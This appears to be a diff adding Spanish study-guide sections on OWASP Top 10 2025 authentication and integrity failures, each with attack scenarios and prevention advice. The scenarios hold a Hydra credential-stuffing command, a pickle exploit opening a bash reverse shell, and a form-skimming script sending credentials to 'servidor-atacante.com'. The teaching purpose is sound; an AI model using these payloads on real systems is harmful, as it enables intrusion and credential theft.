@@ -320,7 +320,169 @@ Por esta razón, aunque, el sistema sea desarrollado correctamente, puede contin
 
 ### 📝 Ejemplo de ataque
 
-![A062025](Imagenes/A062025.jpeg)
+![A062025](Imagenes/A062025.jpeg).
+
+## A07:2025 – Fallos de Autenticación
+
+### ¿Qué es?
+Vulnerabilidades que permiten a un atacante suplantar una identidad legítima o evadir la autenticación, operando con los privilegios de un usuario sin tener credenciales válidas.
+
+### Formas comunes en que ocurre
+- Falta de *rate limiting* → permite ataques de fuerza bruta automatizados
+- Contraseñas débiles o filtradas sin validación
+- MFA débil (SMS, preguntas secretas) o ausente
+- Sesiones mal gestionadas: no se regenera el ID al iniciar sesión (*Session Fixation*), cookies sin `HttpOnly`/`Secure`
+- Tokens/JWT que no se revocan al cerrar sesión
+
+### Ejemplos de ataque reales
+
+#### Escenario n.° 1: Credential Stuffing contra endpoint de API desprotegido
+
+Una aplicación web expone un servicio REST en `/api/v1/auth/login` que no implementa CAPTCHA, bloqueo por intentos repetidos ni autenticación de múltiples factores. Un atacante toma un volcado de cuentas filtradas y automatiza el envío masivo mediante Hydra:
+
+```bash
+hydra -L usuarios_filtrados.txt -P contrasenas_filtradas.txt api.empresa.local http-post-form \
+"/api/v1/auth/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:H=Content-Type: application/json:F=Credenciales invalidas"
+```
+
+El servidor recibe miles de solicitudes sucesivas como la siguiente:
+
+```http
+POST /api/v1/auth/login HTTP/1.1
+Host: api.empresa.local
+Content-Type: application/json
+
+{
+  "email": "carlos.mendoza@empresa.local",
+  "password": "Password123*"
+}
+```
+
+- **Mecánica del ataque:** Al no haber un mecanismo que detenga las solicitudes consecutivas desde la misma dirección IP o hacia la misma cuenta, el script valida credenciales coincidentes.
+- **Resultado:** El backend devuelve una respuesta exitosa (`HTTP 200 OK`) con un token Bearer (`Bearer eyJhbGci...`), concediendo al atacante acceso inmediato a la cuenta de la víctima sin levantar alertas de bloqueo.
+
+#### Escenario n.° 2: Secuestro por fijación de sesión (Session Fixation)
+
+El sistema genera una cookie de sesión cuando un usuario anónimo visita el sitio y **no regenera este identificador** una vez que el usuario se autentica satisfactoriamente.
+
+1. El atacante accede al sitio y extrae el identificador asignado:
+```http
+Set-Cookie: SESSIONID=sesion_trampa_98765; Path=/; HttpOnly
+```
+
+2. El atacante elabora un enlace y se lo envía a la víctima mediante ingeniería social:
+```text
+https://sistema.empresa.local/login?SID=sesion_trampa_98765
+```
+
+3. La víctima hace clic en el enlace e ingresa su usuario y contraseña legítimos. El servidor valida la cuenta pero vincula los derechos del usuario al identificador prefijado `sesion_trampa_98765`.
+
+4. El atacante, quien ya posee ese valor de sesión, realiza una petición directa al sistema:
+```http
+GET /api/cuenta/balance HTTP/1.1
+Host: sistema.empresa.local
+Cookie: SESSIONID=sesion_trampa_98765
+```
+
+- **Resultado:** El servidor procesa la solicitud asumiendo que proviene de la víctima, permitiendo al atacante visualizar datos bancarios o realizar acciones administrativas sin haber conocido nunca la contraseña.
+
+### Cómo prevenirlo
+- MFA obligatorio (FIDO2/WebAuthn, TOTP — no SMS)
+- Contraseñas ≥12 caracteres, validadas contra listas de filtraciones (Have I Been Pwned)
+- *Rate limiting* por IP/cuenta + mensajes de error genéricos
+- Regenerar el ID de sesión tras login exitoso; cookies con `Secure`, `HttpOnly`, `SameSite=Strict`
+- Expiración de sesión por tiempo e inactividad
+
+---
+
+## A08:2025 – Fallos de Integridad del Software o de los Datos
+
+### ¿Qué es?
+Ocurre cuando una aplicación confía en código, dependencias o datos sin verificar su procedencia o integridad (firma, checksum), rompiendo la cadena de confianza.
+
+### Formas comunes en que ocurre
+- Actualizaciones/plugins descargados sin verificar firma digital
+- Deserialización insegura de datos no confiables (`pickle`, `serialize()`)
+- Dependencias externas sin fijar versión ni verificar integridad
+- Pipelines CI/CD sin protección, permitiendo alterar el código antes de producción
+
+### Ejemplos de ataque reales
+
+#### Escenario n.° 1: Ejecución Remota de Código mediante Deserialización Insegura
+
+Una aplicación web escrita en Python almacena el perfil y los privilegios de navegación del usuario en una cookie serializada con la biblioteca nativa `pickle` sin ningún mecanismo de firma o cifrado:
+
+```python
+# Código vulnerable en el backend de la aplicación
+@app.route('/panel')
+def panel():
+    cookie_usuario = request.cookies.get('datos_perfil')
+    # Vulnerabilidad: deserialización de datos provistos por el usuario sin verificar integridad
+    perfil = pickle.loads(base64.b64decode(cookie_usuario))
+    return f"Bienvenido, {perfil['usuario']}"
+```
+
+El atacante utiliza el método mágico `__reduce__` de Python para construir un payload que instruya al servidor a ejecutar comandos del sistema operativo tan pronto como el objeto sea deserializado:
+
+```python
+import pickle, base64, os
+
+class GeneradorExploit:
+    def __reduce__(self):
+        # Inyección de comando para ejecutar una terminal interactiva inversa
+        comando = "bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"
+        return (os.system, (comando,))
+
+payload = base64.b64encode(pickle.dumps(GeneradorExploit())).decode()
+print(payload)
+```
+
+El atacante envía la solicitud maliciosa:
+
+```http
+GET /panel HTTP/1.1
+Host: empresa.local
+Cookie: datos_perfil=gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCViYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS41MC80NDQ0IDA+JjEnlIWUUpQu
+```
+
+- **Mecánica del ataque:** Al llamar a `pickle.loads()`, el entorno de ejecución reconstruye la clase y dispara de manera inmediata `os.system` con los argumentos inyectados.
+- **Resultado:** El atacante establece una conexión de consola interactiva (*reverse shell*) con los mismos privilegios del proceso del servidor web, tomando el control de la máquina.
+
+#### Escenario n.° 2: Manipulación en Tránsito de scripts de CDN sin SRI
+
+Una aplicación web incluye bibliotecas de terceros consumidas directamente desde una red de distribución externa (CDN) sin declarar el atributo de integridad del subrecurso (*Subresource Integrity*):
+
+```html
+<!-- Vulnerabilidad: No se incluye el atributo integrity -->
+<script src="https://cdn-externo.com/librerias/formulario-seguro.js"></script>
+```
+
+1. El atacante logra comprometer el servidor de la CDN externa o aprovecha un ataque Man-in-the-Middle en una red intermedia no autenticada.
+
+2. Modifica el archivo `formulario-seguro.js` agregando código que intercepta las pulsaciones de teclado y los eventos de envío:
+```javascript
+// Código malicioso inyectado dentro del archivo servido por la CDN
+document.addEventListener('submit', function(e) {
+    let credenciales = {
+        usuario: document.getElementById('user_input').value,
+        clave: document.getElementById('pass_input').value
+    };
+    fetch('https://servidor-atacante.com/robo', {
+        method: 'POST',
+        body: JSON.stringify(credenciales)
+    });
+});
+```
+
+- **Mecánica del ataque:** Como el navegador de los usuarios no tiene una directiva `integrity` para contrastar el hash SHA del archivo descargado con un valor esperado, carga y ejecuta el script sin advertencias.
+- **Resultado:** El código modificado opera con pleno acceso al Document Object Model (DOM) del sitio legítimo, capturando y exfiltrando credenciales corporativas en tiempo real.
+
+### Cómo prevenirlo
+- Usar **SRI** (`integrity` + `crossorigin`) en scripts externos
+- Firmar digitalmente binarios y actualizaciones (Sigstore/Cosign)
+- Mantener SBOM (CycloneDX) e integrar SCA (OWASP Dependency-Check/Track)
+- Evitar serialización nativa para datos de clientes; usar JSON/Protobuf con esquema estricto
+- Proteger CI/CD: privilegios mínimos, revisión por pares obligatoria
 
 ## A09:2025 - Fallos en el registro y las alertas de seguridad
 
